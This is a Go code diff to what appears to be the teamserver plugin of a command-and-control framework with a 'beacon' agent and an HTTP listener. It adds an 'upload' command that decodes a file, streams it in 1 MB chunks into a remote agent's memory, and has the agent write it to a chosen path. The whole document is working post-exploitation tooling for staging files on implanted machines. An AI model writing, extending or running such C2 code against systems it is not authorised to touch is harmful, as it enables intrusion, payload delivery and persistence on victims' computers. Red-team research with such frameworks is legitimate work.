@@ -2,19 +2,22 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"math/rand"
 	"strconv"
 	"time"
 )
 
 const (
-	SetName     = "beacon"
-	SetListener = "BeaconHTTP"
-	SetUiPath   = "_ui_agent.json"
-	SetCmdPath  = "_cmd_agent.json"
+	SetName            = "beacon"
+	SetListener        = "BeaconHTTP"
+	SetUiPath          = "_ui_agent.json"
+	SetCmdPath         = "_cmd_agent.json"
+	SetMaxTaskDataSize = 0x1900000 // 25 Mb
 )
 
 func CreateAgent(initialData []byte) (AgentData, error) {
@@ -105,7 +108,38 @@ func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
 	return packData, nil
 }
 
-func CreateTask(agent AgentData, command string, args map[string]any) (TaskData, string, error) {
+func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
+	chunkSize := 0x100000 // 1Mb
+	memoryId := int(rand.Uint32())
+
+	bufferSize := len(buffer)
+
+	taskData := TaskData{
+		Type:    TASK,
+		AgentId: agentId,
+		Sync:    false,
+	}
+
+	for start := 0; start < bufferSize; start += chunkSize {
+		fin := start + chunkSize
+		if fin > bufferSize {
+			fin = bufferSize
+		}
+
+		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
+
+		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
+		taskData.Data, _ = PackArray(array)
+
+		var taskBuffer bytes.Buffer
+		_ = json.NewEncoder(&taskBuffer).Encode(taskData)
+
+		ts.TsTaskQueueAddQuite(agentId, taskBuffer.Bytes())
+	}
+	return memoryId
+}
+
+func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]any) (TaskData, string, error) {
 	var (
 		taskData    TaskData
 		messageInfo string
@@ -259,6 +293,31 @@ func CreateTask(agent AgentData, command string, args map[string]any) (TaskData,
 		}
 		break
 
+	case "upload":
+		messageInfo = "Task: upload file"
+
+		fileName, ok := args["remote_path"].(string)
+		if !ok {
+			err = errors.New("parameter 'remote_path' must be set")
+			goto RET
+		}
+		localFile, ok := args["local_file"].(string)
+		if !ok {
+			err = errors.New("parameter 'local_file' must be set")
+			goto RET
+		}
+
+		fileContent, err := base64.StdEncoding.DecodeString(localFile)
+		if err != nil {
+			goto RET
+		}
+
+		memoryId := CreateTaskCommandSaveMemory(ts, agent.Id, fileContent)
+
+		array = []interface{}{COMMAND_UPLOAD, memoryId, ConvertUTF8toCp(fileName, agent.ACP)}
+
+		break
+
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
@@ -377,6 +436,10 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			task.ClearText = path
 			break
 
+		case COMMAND_UPLOAD:
+			task.Message = "File successfully uploaded"
+			break
+
 		case COMMAND_ERROR:
 			errorCode := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
@@ -387,12 +450,11 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 		}
 
 		_ = json.NewEncoder(&taskObject).Encode(task)
-		ts.TsAgentTaskUpdate(agentData.Id, taskObject.Bytes())
+		ts.TsTaskUpdate(agentData.Id, taskObject.Bytes())
 	}
 }
 
 func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
-
 	fileId, err := strconv.ParseInt(fid, 16, 64)
 	if err != nil {
 		return nil, err
